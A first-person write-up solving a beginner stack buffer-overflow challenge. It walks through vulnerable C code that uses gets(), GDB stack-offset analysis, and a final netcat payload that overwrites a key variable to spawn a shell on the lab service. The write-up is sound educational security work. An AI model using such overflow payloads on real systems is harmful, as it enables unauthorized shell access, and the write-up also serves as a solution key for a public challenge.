As usual there are the the executable and c program but there is no flag file. there is a readme file.
```bash
bof@ubuntu:~$ ls -l
total 24
-rwxr-xr-x 1 root bof  15300 Mar 26 13:03 bof
-rw-r--r-- 1 root root   342 Mar 26 13:09 bof.c
-rw-r--r-- 1 root root    86 Apr  3 16:03 readme
```

The readme file contained:
```
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
```

`nc` is short for netcat. So `nc 0 9000` is `netcat ip=0 port=9000`

next I opened the `bof.c` file
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

reading the code I saw that I needed to overflow `overflowme` to change the key variable in the memory.

Every function in c has a stack frame where all of its local variables are held.
this stack frame holds local variables and the passed arguments (such as key)

To start experimenting I copied the script to my local machine and started debugging the program.
Opening the program in GDB (GNU Debugger) I could see the locations of the vars in the stack

| var        | loc            |
| ---------- | -------------- |
| key        | 0x7fffffffdcbc |
| overflowme | 0x7fffffffdcc0 |

meaning that they right after each other
Knowing this I understood that I will not be able to change it. I decided to try and change the ret of the function to enter the if statement and run the `system` function call

After a week where I did not touch this CTF I came back with a fresh mind and started again.
I decided to take a closer look at the compiled assembly code and saw the offset where the key was stored in the stack

```assembly
; Moving 0xdeadbeef to the stack at rbp - 52
movl    %edi, -52(%rbp)
```

moving the lower 32 bits of rdx to where the base pointer is pointing at minus 52 bytes.

```
(gdb) x/4xb $rbp-52
0x7fffffffdcbc: 0xef    0xbe    0xad    0xde
```

now I needed to see where overflowme was stored relative to rbp and then I could try implementing the attack.
```
(gdb) p &overflowme
$12 = (char (*)[32]) 0x7fffffffdcc0
```

Now knowing that there are 4 bytes between them `0xDCC0 - 0xDCBC = 0x4`
Then I read what I wrote already and saw that I couldn't change key....
since the return address is saved before rbp I know that I will be able to access and change it.

seeing that there are 56 bytes between them:
- ret address: `rbp + 8 = 0x7fffffffdcf8`
- overflowme address: `rbp - 48 = 0x7fffffffdcc0`

to solve this I needed to keep the stack canary as it is but since this was a "Toddler's Bottle" challenge so I knew that something was wrong.

I decided to see if I did something wrong when copying this file to my local and saw the compile error I have done.
```
ophirky@opc:~/code$ file main
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c7b6c9189ceb22cd5c834beb4e310163294f679a, for GNU/Linux 3.2.0, with debug_info, not stripped
```

It was 64 bits. the original file was 32. The difference between th e64 bit and 32 bit is that the argument is passed via the stack in 32 bits and through rdi in 64 bits.

Now I had to just put the correct string in the pwnable challenge and use a simple buffer overflow to override key.

| value name     | size     |
| -------------- | -------- |
| key            | 4 bytes  |
| return address | 4 bytes  |
| ebp            | 4 bytes  |
| stack canary   | 4 bytes  |
| overflowme     | 32 bytes |

To run over the key I need to add to the buffer an additional 16 bytes including the address (12 without). so the input can look like this:
`b'A' * (44) + b'\xbe\xba\xfe\xca'`

Running:
```python
bof@ubuntu:~$ python3
>>> import subprocess
>>> t = b'A' * 44 + b'\xbe\xba\xfe\xca'
>>> subprocess.run(['./bof'], input=t)
```
did not work.

```
pwndbg> x $ebp
0xffffd518:     0xffffd538

pwndbg> x $ebp + 8
0xffffd520:     0xdeadbeef

pwndbg> x $ebp + 4
0xffffd51c:     0x565562c5
```

looking in gdb and the assembly I saw that 0x2c was subtracted from ebp when giving the allocation address. why?
doesn't really matter. just need to add that to the input
first success:
```
pwndbg> x/4xb $ebp + 8
0xffffd520:     0x41    0x41    0x41    0x41
```
This means that we ran over the key. now we just need to run it over with the correct values.

I tried running the exploit it self in gdb and saw that it does work but still did not execute the shell...
the comparison assembly line in gdb:
`► 0x5655623c <func+63> cmp dword ptr [ebp + 8], 0xcafebabe (0xcafebabe - 0xcafebabe)`

Now the exploit was working but for some reason the `system` function did not run...
I tried running the entire program in GDB without any breakpoints to see what errors rose (if any)
```bash
pwndbg> r < <(python2 -c "print b'A'*52 + b'\xbe\xba\xfe\xca'")
Starting program: /home/bof/bof < <(python2 -c "print b'A'*52 + b'\xbe\xba\xfe\xca'")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0xf7fbf500 (LWP 1559836) vfork to child process 1559841]
[New inferior 2 (process 1559841)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1559836 after child exec]
[Inferior 1 (process 1559836) detached]
process 1559841 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7d83740 (LWP 1559841) vfork to child process 1559845]
[New inferior 3 (process 1559845)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1559841 after child exec]
[Inferior 2 (process 1559841) detached]
process 1559845 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 3 (process 1559845) exited normally]
*** stack smashing detected ***: terminated
```
So no errors rose and the shell did run. so I needed to understand why I could not interact with it...

After getting very mad and sad I researched and understood that it was not interactive since for some reason piping the payload closed the STDIN so I couldn't send any commands to the shell and I had no idea on how to solve this so I talked to a friend of mine that had done the same CTF and got  stuck on the exact same thing. He told me that he also had no idea and just told me that I need to add a `cat` command after the payload to leave it open. so that is what I did and it worked!
 ```bash
bof@ubuntu:~$ nc 0 9000 < <(python2 -c "print b'A'*52 + b'\xbe\xba\xfe\xca'"; cat)
cat flag
[flag🤫]
 ```
